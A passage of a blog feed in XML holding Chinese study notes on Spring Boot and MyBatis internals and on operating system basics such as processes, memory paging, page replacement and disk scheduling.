href="#SpringBoot自动配置原理" class="headerlink" title="SpringBoot自动配置原理"></a>SpringBoot自动配置原理</h1><p><img src="/2022/05/22/Spring/1657697784371-eba47024-6dc8-4aee-852e-2cb8a8d8219f.jpeg"><br>@SpringBootApplication可以看作是 @SpringBootConfiguration、@EnableAutoConfiguration、@ComponentScan 注解的集合。根据 SpringBoot 官网，这三个注解的作用分别是：</p><ul><li><strong>@EnableAutoConfiguration：启用 SpringBoot 的自动配置机制</strong></li><li>@SpringBootConfiguration：允许在上下文中注册额外的 bean 或导入其他配置类</li><li>@ComponentScan： 扫描被@Component (@Service,@Controller)注解的 bean，注解默认会扫描启动类所在的包下所有的类 ，可以自定义不扫描某些 bean。如下图所示，容器中将排除TypeExcludeFilter和AutoConfigurationExcludeFilter。</li></ul><p><strong>@EnableAutoConfiguration</strong><br>Spring中有很多Enable开头的注解其作用就是借助@Import来收集并注册特定场景相关的Bean，并加载到IOC容器。<br>@EnableAutoConfiguration就是借助@lmport来收集所有符合自动配置条件的bean定义，并加载到IOC容器。</p><ul><li>@Import（AutoConfigurationImportSelector.class）<ul><li>帮助SpringBoot将所有符合条件的@Configuration配置都加载到当前SpringBoot创建并使用的IOC容器中。</li><li>AutoConfigurationImportSelector类实现了Aware相关接口</li><li>其中getImports()中调用selectImports()</li></ul></li><li>@AutoConfigurationPackage<ul><li>@Import：导入Registar组件 就干一件事：拿到启动类所在的包名。</li></ul></li></ul><h1 id="SpringBoot常用注解及底层实现原理"><a href="#SpringBoot常用注解及底层实现原理" class="headerlink" title="SpringBoot常用注解及底层实现原理"></a>SpringBoot常用注解及底层实现原理</h1><p>1.@SpringBootApplication注解:这个注解标识了一个SpringBoot工程，它实际上是另外三个注解的组合，这三个注解是:</p><ul><li>@SpringBootConfiguration:这个注解实际就是一个@Configuration，表示启动类也是一个配置类</li><li>.@EnableAutoConfiguration:向Spring容器中导入了一个Selector，用来加载Classpath 下SpringFactories中所定义的自动配置类，将这些自动加载为配置Bean</li><li>@ComponentScan:标识扫描路径，因为默认是没有配置实际扫描路径，所以SpringBoot扫描的路径是启动类所在的当前目录</li></ul><p>2.@Bean注解:用来定义Bean，类似于XML中的<bean>标签，Spring在启动时，会对加了@Bean注解的方法进行解析，将方法的名字做为beanName，并通过执行方法得到bean对象<br>3.@Controller、@Service、@ResponseBody、@Autowired都可以说</bean></p><h1 id="如何理解SpringBoot中的starter"><a href="#如何理解SpringBoot中的starter" class="headerlink" title="如何理解SpringBoot中的starter"></a>如何理解SpringBoot中的starter</h1><ul><li>使用spring + springmvc使用，如果需要引入mybatis等框架，需要到xml中定义mybatis需要的bean</li><li>starter就是定义一个starter的jar包，写一个@Configuration配置类、将这些bean定义在里面，然后在starter包的META-INF/spring.factories中写入该配置类,springboot会按照约定来加载该配置类</li><li>开发人员只需要将相应的starter包依赖进应用，进行相应的属性配置（使用默认配置时，不需要配置)，就可以直接进行代码开发，使用对应的功能了，比如mybatis-spring-boot-starter，spring-boot-starter-redis</li></ul><h1 id="Springboot的启动流程细节"><a href="#Springboot的启动流程细节" class="headerlink" title="Springboot的启动流程细节"></a>Springboot的启动流程细节</h1><p><img src="/2022/05/22/Spring/1657524571135-80f4d35a-d4fa-45bd-9af1-dad6027fe356-167405415598819.png" alt="1657524571135-80f4d35a-d4fa-45bd-9af1-dad6027fe356"></p><ol><li>SpringBoot启动的时候，会构造一个SpringApplication的实例，然后调用这个实例的run方法，在run方法调用之前，也就是构造SpringApplication的时候会进行初始化的工作，初始化的时候会做以下几件事：<br>(1)把参数<code>sources</code>设置到<code>SpringApplication</code>属性中，这个<code>sources</code>可以是任何类型的参数.<br>(2)判断是否是web程序，并设置到<code>webEnvironment</code>的<code>boolean</code>属性中.<br>(3)创建并初始化<code>ApplicationInitializer</code>，设置到<code>initializers</code>属性中 。<br>(4)创建并初始化<code>ApplicationListene</code>r，设置到<code>listeners</code>属性中 。<br>(5)初始化主类<code>mainApplicatioClass</code>。</li><li>SpringApplication构造完成之后调用run方法，启动<code>SpringApplication</code>，run方法执行的时候会做以下几件事：<br>(1)构造一个<code>StopWatch</code>计时器，观察<code>SpringApplication</code>的执行 。<br>(2)获取<code>SpringApplicationRunListeners</code>并封装到<code>SpringApplicationRunListeners</code>中启动，用于监听<code>run</code>方法的执行。<br>(3)创建并初始化<code>ApplicationArguments</code>,获取<code>run</code>方法传递的<code>args</code>参数。<br>(4)创建并初始化<code>ConfigurableEnvironment</code>（环境配置）。<br>(5)打印<code>banner</code>（只用在<code>Classpath</code>下添加字符文件图标，就可以在启动时候打印）。<br>(3)构造Spring容器(<code>ApplicationContext</code>)上下文。<br>(4)<code>SpringApplicationRunListeners</code>发布<code>finish</code>事件。<br>(5)<code>StopWatch</code>计时器停止计时。</li></ol><h1 id="MyBatis优缺点"><a href="#MyBatis优缺点" class="headerlink" title="MyBatis优缺点"></a>MyBatis优缺点</h1><p>优点:</p><ul><li>基于SQL语句编程，相当灵活，不会对应用程序或者数据库的现有设计造成任何影响，SQL写在XML里，解除sql与程序代码的耦合，便于统一管理;提供XML标签，支持编写动态SQL语句，并可重用。</li><li>与JDBC相比，减少了50%以上的代码量，消除了JDBC大量冗余的代码，不需要手动开关连接;</li><li>很好的与各种数据库兼容（因为MyBatis 使用JDBC来连接数据库，所以只要JDBC支持的数据库MyBatis都支持)。</li><li>能够与Spring很好的集成;</li><li>供映射标签，支持对象与数据库的ORM字段关系映射;提供对象关系映射标签，支持对象关系组件维护。</li></ul><p>缺点:</p><ul><li><p>SQL语句的编写工作量较大，尤其当字段多、关联表多时，对开发人员编写SQL语句的功底有一定要求。</p></li><li><p>SQL语句依赖于数据库，导致数据库移植性差，不能随意更换数据库。</p><h1 id="和-区别"><a href="#和-区别" class="headerlink" title="#{} 和 ${}区别"></a>#{} 和 ${}区别</h1></li><li><p>#{}是预编译处理是占位符，${}是字符串替换、是拼接符。</p></li><li><p>Mybatis在处理#{}时，会将sql中的#{}替换为?号，调用PreparedStatement来赋值，会有预编译，#对应的变量自动加上单引号；</p></li><li><p>Mybatis在处理${}时，就是把${}替换成变量的值，是动态参数（比如通过传参动态设置表名，动态设置排序字段），调用Statement来赋值，相当于直接拼接，${}对应的变量不会加上单引号；</p></li><li><p>使用#{}可以有效的防止SQL注入，提高系统安全性。</p><h1 id="MyBatis二级缓存"><a href="#MyBatis二级缓存" class="headerlink" title="MyBatis二级缓存"></a>MyBatis二级缓存</h1><p>Mybatis 中有一级缓存和二级缓存，默认情况下一级缓存是开启的，而且是不能关闭的。一级缓存 是指 SqlSession 级别的缓存，当在同一个 SqlSession 中进行相同的 SQL 语句查询时，第二次以 后的查询不会从数据库查询，而是直接从缓存中获取，一级缓存最多缓存 1024 条 SQL。二级缓存 是指可以跨 SqlSession 的缓存。是 mapper 级别的缓存，对于 mapper 级别的缓存不同的 sqlsession 是可以共享的  </p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Spring、Mybatis&lt;/p&gt;</summary>
    
    
    
    <category term="后端开发" scheme="https://winkygranger.github.io/categories/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/"/>
    
    
    <category term="spring" scheme="https://winkygranger.github.io/tags/spring/"/>
    
  </entry>
  
  <entry>
    <title>操作系统</title>
    <link href="https://winkygranger.github.io/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    <id>https://winkygranger.github.io/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/</id>
    <published>2022-05-22T13:03:41.000Z</published>
    <updated>2023-01-21T08:56:34.189Z</updated>
    
    <content type="html"><![CDATA[<p>操作系统基础知识</p><span id="more"></span><h1 id="进程、线程、协程"><a href="#进程、线程、协程" class="headerlink" title="进程、线程、协程"></a>进程、线程、协程</h1><p>进程是系统资源分配和调度的最小单位、<br>线程是操作系统分配和调度的最小单位<br>线程分成更小的协程，多个协程共享一个线程。<br>线程切换是一个操作系统层面的行为，要关中断、保存断点、终端服务寻址、开中断执行服务<br>协程间切换是runtime的 行为<br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658146534047-a200795a-9aad-4eae-b0cc-c17df81a3f03.png"></p><h1 id="操作系统运行机制"><a href="#操作系统运行机制" class="headerlink" title="操作系统运行机制"></a>操作系统运行机制</h1><ul><li><p>时钟管理</p></li><li><p>中断机制</p><ul><li><p>外中断：中断信号来源于外部设备（被迫的）</p></li><li><p>内中断：中断信号来源于当前指令（自愿的）：</p><ul><li>陷入指令（应用程序引发的，cpu产生），比如程序执行到某处需要进行读文件操作，cpu从用户态切换到内核态</li><li>内存缺页中断<table><thead><tr><th><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658643001593-35048363-b135-4161-9a30-4c184493dca2.png"></th><th><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658643772980-833f7727-579a-4fd6-95f9-2d73382c28b1.png"></th></tr></thead></table></li></ul></li><li></li></ul></li><li><p>原语（原语的底层实现就是靠开中断和关中断实现的）</p><ul><li>若干条指令组成</li><li>完成某个特定功能</li><li>执行过程不会被中断（具有原子性）</li></ul></li><li><p>系统数据结构</p><ul><li>进程管理：作业控制快、进程控制块</li><li>存储器管理：存储器分配与回收</li><li>设备管理：缓冲区、设备控制快</li></ul></li><li><p>系统调用（应用程序去访问操作系统内核的时候）</p><ul><li>一套接口的集合</li><li>应用程序去访问操作系统内核服务的方式<h1 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h1></li></ul></li></ul><p><strong>PCB:<strong>为了描述控制进程的运行，系统中存放进程的管理和控制信息的数据结构称为</strong>进程控制块</strong>（PCB Process Control Block），它是进程实体的一部分，是操作系统中最重要的记录性数据结构。它是进程管理和控制的最重要的数据结构，每一个进程均有一个PCB，在创建进程时，建立PCB，伴随进程运行的全过程，直到进程撤消而撤消。<br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157424101-9c5d3320-4b20-4459-801c-a94d8e7f4a9c.png"><br>寄存器里面放的是有些程序运行计算了一半被抢占了，记录执行的位置，下次执行可以接着中间数据往下执行<br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157467622-4d68b3f0-01f7-41f1-9b49-69906b69339f.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157534537-7b08b675-a40f-41ed-95c3-7faf870ca7f3.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157550287-c44edf86-87c9-4b8c-a08a-e68e736df1ee.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157564861-c16c83be-d673-417d-831e-b50617f728e7.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157596450-42cb6f02-711c-49b8-ab9c-e87fec40db9a.png"></p><h2 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h2><ul><li><strong>其实是七状态，还有阻塞挂起和就绪挂起</strong></li></ul><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157617052-e7ab12d7-76a6-4ea5-a3f8-7a6c3fb9fbf8.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157633365-8807891a-c046-45a4-bc2d-ef207c45ce82.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157649661-df255dd3-3482-4cc6-9d42-59cf5407d02e.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157658029-8e23f390-085d-4784-9661-611d2d31bc04.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157672128-4ced56fb-a58e-449a-9b0b-66523b85dffe.png"></p><h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><h3 id="共享存储：共享空间对于多个进程访问是互斥的"><a href="#共享存储：共享空间对于多个进程访问是互斥的" class="headerlink" title="共享存储：共享空间对于多个进程访问是互斥的"></a><strong>共享存储</strong>：共享空间对于多个进程访问是互斥的</h3><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157690879-ac5982b5-e22a-4fb1-b25a-bcb992b488fa.png"></p><h3 id="管道通信：没写满的时候是不允许读的，没读完也是不允许写的。"><a href="#管道通信：没写满的时候是不允许读的，没读完也是不允许写的。" class="headerlink" title="管道通信：没写满的时候是不允许读的，没读完也是不允许写的。"></a><strong>管道通信</strong>：没写满的时候是不允许读的，没读完也是不允许写的。</h3><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157704285-3c4bd803-d8f0-40a0-8f2b-0cb9ebf26a35.png"></p><h3 id="消息队列：消息头里包含了传递信息，不会传错给别的进程"><a href="#消息队列：消息头里包含了传递信息，不会传错给别的进程" class="headerlink" title="消息队列：消息头里包含了传递信息，不会传错给别的进程"></a><strong>消息队列</strong>：消息头里包含了传递信息，不会传错给别的进程</h3><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157716803-dc8e2ce0-7f82-431a-8500-46e56df8bbc6.png"></p><h3 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h3><h3 id="套接字-socket"><a href="#套接字-socket" class="headerlink" title="套接字 socket"></a>套接字 socket</h3><h1 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157761743-17c43c42-06a3-4ca3-b39b-cf3483774828.png" alt="image-20220525205412434.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157779581-9aa43107-f932-42a6-9c1d-af2335e158f8.png"></p><h2 id="线程的实现方式（用户级线程、内核级线程、组合方式）"><a href="#线程的实现方式（用户级线程、内核级线程、组合方式）" class="headerlink" title="线程的实现方式（用户级线程、内核级线程、组合方式）"></a>线程的实现方式（用户级线程、内核级线程、组合方式）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157836867-f256ed5c-6a60-42f0-a520-d4bc1a50bc5e.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157860633-7ac128c9-a0e4-4166-bc2c-db2c029e9b76.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157876158-13a6e076-5253-4e59-8604-0bdfce151a9b.png"></p><h2 id="多线程模型：多对一、一对多"><a href="#多线程模型：多对一、一对多" class="headerlink" title="多线程模型：多对一、一对多"></a>多线程模型：多对一、一对多</h2><p>n个用户级线程映射到内核级线程上</p><h1 id="处理机调度（线程调度）"><a href="#处理机调度（线程调度）" class="headerlink" title="处理机调度（线程调度）"></a>处理机调度（线程调度）</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157951018-84ad97a5-07db-48f8-a6dc-6fb440d6c976.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658157983980-95ed9a46-5767-4537-a9fc-3fba4a51546b.png"></p><h1 id="进程同步"><a href="#进程同步" class="headerlink" title="进程同步"></a>进程同步</h1><ol><li>**互斥量(Mutex)**：采用互斥对象机制，只有拥有互斥对象的线程才有访问公共资源的权限。因为互斥对象只有一个，所以可以保证公共资源不会被多个线程同时访问。比如 Java 中的 synchronized 关键词和各种 Lock 都是这种机制。</li><li><strong>信号量(Semaphore)</strong> ：它允许同一时刻多个线程访问同一资源，但是需要控制同一时刻访问此资源的最大线程数量。</li><li><strong>事件(Event)</strong> :Wait/Notify：通过通知操作的方式来保持多线程同步，还可以方便的实现多线程优先级的比较操作。</li><li><strong>临界区</strong>：拥有临界区的线程可以访问被保护资源，其他访问会被挂起。<ol><li>双标志前检查法：先检查其他进程是否想要临界区，再上锁</li><li>双标志后检查法：先上锁在检查其他进程是否想要临界区</li><li>Peterson算法：双方都争着使用临界区的话，可以尝试让一方主动让对方先使用临界区<h2 id="进程互斥"><a href="#进程互斥" class="headerlink" title="进程互斥"></a>进程互斥</h2><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158012726-ffb3adac-99e8-4330-b9f7-9a4daf0aa9e3.png"><h2 id="临界区冲突"><a href="#临界区冲突" class="headerlink" title="临界区冲突"></a>临界区冲突</h2></li></ol></li></ol><ul><li><p>空闲让进：一次进一个，进不来的挂起</p></li><li><p>忙则等待：</p></li><li><p>有限等待：有限时间内退出</p></li><li><p>让权等待：进程不能进入自己的临界区，则应该让出CPU，避免出现忙等现象</p><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1></li><li><p>互斥条件：对必须互斥资源的争抢才会导致死锁</p></li><li><p>不剥夺条件：进程获得的资源在未使用完之前不能由其他进程强行夺走，只能主动释放</p></li><li><p>请求和保持条件：进程已经保持至少一个资源，但又提出了新的资源请求，而该资源又被其他进程占有，此时请求被阻塞，但又对自己的资源保持不放</p></li><li><p>循环等待条件：存在资源的循环等待链</p><h2 id="预防死锁"><a href="#预防死锁" class="headerlink" title="预防死锁"></a>预防死锁</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158043661-63ad5a48-4ece-4133-95a2-6ee28bdb9bc1.png"></p></li></ul><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158043696-c61c58b3-30e2-48f7-b5a2-7e596c8bd975.png"></p><h2 id="避免死锁（银行家算法）"><a href="#避免死锁（银行家算法）" class="headerlink" title="避免死锁（银行家算法）"></a>避免死锁（银行家算法）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158064389-438c1ea3-03e4-4ff8-885d-2c9dfd794d49.png"></p><h1 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158081123-76c74a83-6e9d-4ee9-9ecf-0e2f2341ddab.png"></p><h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158151854-76a4639d-52ca-47a8-9d62-b0460c969d29.png"></p><h2 id="覆盖技术"><a href="#覆盖技术" class="headerlink" title="覆盖技术"></a>覆盖技术</h2><p>下图A调用B、C是依次调用的，因此B、C可以共同使用程序X的覆盖区0（图中绿色），从逻辑上看，物理内存是被”拓展“了</p><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158112508-a2f932c5-e6f0-4068-a508-383bcbcf32d2.png"></p><h2 id="交换技术"><a href="#交换技术" class="headerlink" title="交换技术"></a>交换技术</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158172464-cc257844-d0b8-4a33-af13-b1ee6ac8607a.png"></p><p><strong>换入、换出</strong></p><h2 id="内存分配"><a href="#内存分配" class="headerlink" title="内存分配"></a>内存分配</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158204808-b681f6db-c97a-429b-bc25-83c3284341ae.png"></p><h2 id="管理方式（单一连续分配、固定分区分配方式"><a href="#管理方式（单一连续分配、固定分区分配方式" class="headerlink" title="管理方式（单一连续分配、固定分区分配方式)"></a>管理方式（单一连续分配、固定分区分配方式)</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158224980-b659fd89-1faf-4643-a5cb-03eed5a12e68.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158234845-b04bc958-e489-49da-8b3f-9f721527a0d9.png"></p><h1 id="分页"><a href="#分页" class="headerlink" title="分页"></a>分页</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158250381-97177780-526d-4d9d-9cd8-dfb93620167d.png"><br>不同的页面是<strong>离散</strong>地存放在内存中</p><h2 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h2><p><strong>每个进程都有自己的页表</strong><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158280081-393ad2c7-c4d6-4f99-868a-0e459b444219.png"></p><p><strong>问题：</strong><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158298806-2e2738db-5545-415b-b57b-688ee329aa0d.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158311748-de2659ab-ad99-460a-82e0-816c56a39ac7.png"><br><strong>相当于把以前的页表查分成多个页表，并为多个页表加一个目录，叫做”页目录表“</strong><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158322354-aa473fff-e254-475e-bb59-9bc64e655325.png"></p><h1 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h1><h2 id="传统存储"><a href="#传统存储" class="headerlink" title="传统存储"></a>传统存储</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158335651-40908ec2-147a-4fbd-9488-1cc4617e521a.png"><br><strong>例如，GTA游戏一共60G，电脑是4G的，如果要玩的话需要全部加载到内存中，显然是不够的，但是我在A场景时只用放入A场景的资源就可以了，而这种传统方式会需要整个游戏全部加驻留在内存中。</strong><br>虚拟内存基于<strong>局部性原理</strong><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158355786-1e819fc4-b028-4465-8351-d0375c4970e4.png"></p><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158362257-e8928b4e-20f6-4df5-bac6-3e4fe059d1fb.png"></p><h1 id="实现虚拟内存的技术"><a href="#实现虚拟内存的技术" class="headerlink" title="实现虚拟内存的技术"></a>实现虚拟内存的技术</h1><h2 id="请求分页存储管理"><a href="#请求分页存储管理" class="headerlink" title="请求分页存储管理"></a>请求分页存储管理</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158371530-afdb3c2c-c7e4-4171-9c3e-c5f0076974bc.png"></p><h2 id="内存有空闲的情况"><a href="#内存有空闲的情况" class="headerlink" title="内存有空闲的情况"></a>内存有空闲的情况</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158380064-7c1ffdd6-4694-4eb9-988a-83e5c2913470.png"></p><h2 id="内存没空闲的情况"><a href="#内存没空闲的情况" class="headerlink" title="内存没空闲的情况"></a>内存没空闲的情况</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158388208-d4925211-477e-4e0c-8aef-67192ab0e4b5.png"></p><h2 id="请求分段存储管理"><a href="#请求分段存储管理" class="headerlink" title="请求分段存储管理"></a>请求分段存储管理</h2><h2 id="请求段页式存储管理"><a href="#请求段页式存储管理" class="headerlink" title="请求段页式存储管理"></a>请求段页式存储管理</h2><h1 id="页面替换算法"><a href="#页面替换算法" class="headerlink" title="页面替换算法"></a>页面替换算法</h1><h2 id="最佳置换算法（OPT）"><a href="#最佳置换算法（OPT）" class="headerlink" title="最佳置换算法（OPT）"></a>最佳置换算法（OPT）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158399204-b53877bb-9c91-4d04-91b7-52d51625e80b.png"></p><h2 id="先进先出置换算法（FIFO）"><a href="#先进先出置换算法（FIFO）" class="headerlink" title="先进先出置换算法（FIFO）"></a>先进先出置换算法（FIFO）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158408049-8a0291b7-ebfb-4cdb-808c-3e14a3a164a0.png"></p><h2 id="最近最久未使用置换算法（LRU）"><a href="#最近最久未使用置换算法（LRU）" class="headerlink" title="最近最久未使用置换算法（LRU）"></a>最近最久未使用置换算法（LRU）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158417644-270d71f9-8e6f-4a09-9336-374fd69186e7.png"></p><h2 id="时钟置换算法（CLOCK）"><a href="#时钟置换算法（CLOCK）" class="headerlink" title="时钟置换算法（CLOCK）"></a>时钟置换算法（CLOCK）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158427495-5547f211-e57d-40fd-8ffe-680af304a7a4.png"></p><ul><li>内存块排布类似于循环链表</li><li>到6页面的时候，由于5个内存块都满了，就需要先箭头转一圈全部置为0，然后替换最开始的位置，后面用到的继续置为1，全为1的时候再转一圈变为0，然后又从队首开始替换。箭头扫描的过程有点像时钟转，故命名为时钟置换算法。<h2 id="改造型的时钟置换算法"><a href="#改造型的时钟置换算法" class="headerlink" title="改造型的时钟置换算法"></a>改造型的时钟置换算法</h2><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158438287-b7ac793f-f05c-4393-82c7-b5faae306617.png"><br>因为之前说到分页存储的时候，再替换过程中如果一个页面被修改过，则需要写入外存中去。这个时候给他加一个标记，被修改过的时候修改位标记为1。</li></ul><h1 id="磁盘结构"><a href="#磁盘结构" class="headerlink" title="磁盘结构"></a>磁盘结构</h1><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158450843-3a53646d-0ca9-4780-b220-58ca5b7e7722.png"><br><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158483090-1d3ac7fd-23c4-45a1-90f8-2944000246a5.png"></p><h2 id="活动头磁盘、固定头磁盘"><a href="#活动头磁盘、固定头磁盘" class="headerlink" title="活动头磁盘、固定头磁盘"></a>活动头磁盘、固定头磁盘</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158469108-6cf624dd-7ce3-444c-873d-a216fd36f049.png"></p><h2 id="写磁盘需要的时间流程（寻道时间、延迟时间、传输时间）"><a href="#写磁盘需要的时间流程（寻道时间、延迟时间、传输时间）" class="headerlink" title="写磁盘需要的时间流程（寻道时间、延迟时间、传输时间）"></a>写磁盘需要的时间流程（寻道时间、延迟时间、传输时间）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158501047-04a2ca45-549f-4ed6-a8d8-2d51bd28fdb8.png"></p><h2 id="磁盘调度算法"><a href="#磁盘调度算法" class="headerlink" title="磁盘调度算法"></a>磁盘调度算法</h2><h2 id="先来先服务"><a href="#先来先服务" class="headerlink" title="先来先服务"></a>先来先服务</h2><h2 id="最短寻找时间优先"><a href="#最短寻找时间优先" class="headerlink" title="最短寻找时间优先"></a>最短寻找时间优先</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/22222537/1658158518539-3d68ccd1-321e-41f8-b3db-b9df757810bb.png?x-oss-process=image/resize,w_750,limit_0" alt="image-20220528113135927.png"></p><h2 id="扫描算法"><a href="#扫描算法" class="headerlink" title="扫描算法"></a>扫描算法</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158559714-a5dc5914-614c-4e1d-8698-60bbd7bfa485.png"></p><h2 id="LOOK调度算法（扫描算法改进）"><a href="#LOOK调度算法（扫描算法改进）" class="headerlink" title="LOOK调度算法（扫描算法改进）"></a>LOOK调度算法（扫描算法改进）</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158526101-4f39919e-b815-4ca2-b63d-c0e554fff524.png"></p><h2 id="循环扫描算法（扫描算法改进）主要是各个磁道响应时间比较平均"><a href="#循环扫描算法（扫描算法改进）主要是各个磁道响应时间比较平均" class="headerlink" title="循环扫描算法（扫描算法改进）主要是各个磁道响应时间比较平均"></a>循环扫描算法（扫描算法改进）主要是各个磁道响应时间比较平均</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158534958-e576259b-88f5-4d33-b8d6-9df4e626d1d0.png"></p><h2 id="C-LOOK调度算法"><a href="#C-LOOK调度算法" class="headerlink" title="C-LOOK调度算法"></a>C-LOOK调度算法</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158580532-848e4291-1772-4116-9e1f-d2818f5b2613.png"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><img src="/2022/05/22/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/1658158591526-1b1a6d83-631f-4e5f-a7f2-692bd85bc18d.png"></p><h2 id="减少磁盘延迟时间的方法"><a href="#减少磁盘延迟时间的方法" class="headerlink" 